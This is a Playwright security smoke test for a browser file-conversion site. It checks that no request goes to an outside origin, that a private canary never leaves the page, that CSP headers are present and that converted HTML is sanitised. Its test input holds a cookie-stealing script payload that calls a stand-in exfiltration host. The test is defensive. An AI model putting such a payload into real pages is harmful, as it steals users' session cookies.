// Independent browser privacy gate. The sentinel is allowed in the downloaded
// artifact but must never appear in a request URL or request body. This is not
// a proof against malicious same-origin code or browser-level side channels.
import { chromium } from 'playwright';

const base = process.env.SMOKE_URL ?? 'http://localhost:3000';
const origin = new URL(base).origin;
const marker = 'HIGHWALL_PRIVATE_CANARY_92BC03';
const violations = [];
const browser = await chromium.launch({ channel: 'chrome', headless: true });

try {
  const context = await browser.newContext({ acceptDownloads: true, locale: 'en-US' });
  const page = await context.newPage();
  context.on('request', (request) => {
    const u = new URL(request.url());
    if ((u.protocol === 'http:' || u.protocol === 'https:') && u.origin !== origin)
      violations.push(`External origin: ${u.origin}`);
    const url = decodeURIComponent(request.url());
    if (url.includes(marker)) violations.push(`Sentinel in request URL: ${u.origin}`);
    const body = request.postData();
    if (body?.includes(marker)) violations.push(`Sentinel in request body: ${u.origin}`);
  });
  const response = await page.goto(base, { waitUntil: 'networkidle' });
  if (!response?.ok()) throw new Error('Site did not load');
  const headers = response.headers();
  const csp = headers['content-security-policy'] ?? '';
  for (const directive of ['default-src', 'connect-src', 'object-src', 'frame-ancestors']) {
    if (!csp.includes(directive)) violations.push(`Missing CSP directive: ${directive}`);
  }
  if (headers['x-content-type-options'] !== 'nosniff') violations.push('Missing nosniff');
  await page.setInputFiles('input[type="file"]:not([webkitdirectory])', {
    name: 'private-canary.md',
    mimeType: 'text/markdown',
    buffer: Buffer.from(
      `# Privacy check\n\n${marker}\n\n<script>fetch('https://exfil.invalid/'+document.cookie)</script>`,
    ),
  });
  await page.waitForSelector('[role="listitem"]', { timeout: 15000 });
  await page.locator('select[aria-label="Target format"]').first().selectOption('html');
  await page.locator('button[aria-label^="CONVERT →"]').first().click();
  await page.locator('button[aria-label="DOWNLOAD"]').first().waitFor({ timeout: 30000 });
  const [download] = await Promise.all([
    page.waitForEvent('download', { timeout: 20000 }),
    page.locator('button[aria-label="DOWNLOAD"]').first().click(),
  ]);
  const { readFile } = await import('node:fs/promises');
  const output = await readFile(await download.path(), 'utf8');
  if (!output.includes(marker)) violations.push('Downloaded output lost the canary');
  if (/<script\b|exfil\.invalid/.test(output))
    violations.push('Downloaded output contains unsafe HTML');
  await page.waitForTimeout(600);
  await context.close();
} finally {
  await browser.close();
}
if (violations.length) {
  console.error('[security-egress] FAIL:', violations.join(' | '));
  process.exitCode = 1;
} else {
  console.log(
    '[security-egress] PASS: no observed external request, no sentinel in outgoing requests, CSP present, safe artifact',
  );
}
